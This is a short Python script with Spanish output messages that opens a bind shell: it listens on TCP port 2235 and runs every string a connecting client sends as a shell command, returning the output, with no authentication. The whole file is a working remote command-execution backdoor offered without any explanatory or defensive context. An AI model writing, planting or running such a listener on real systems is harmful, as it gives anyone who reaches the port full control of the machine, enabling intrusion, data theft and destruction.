#!/usr/bin/python3

import socket
import subprocess

nombre_equipo = socket.gethostname()
HOST = socket.gethostbyname(nombre_equipo)
PORT = 2235 
server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)
print("Escuchando en la dirección ", HOST, "y puerto ", PORT)
while True:
    
    client, client_addr = server.accept()

    while True:
        
        command = client.recv(1024)
        command = command.decode()
        if command == "exit":
            break
        else: 

            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            client.send(output + output_error)


    client.close()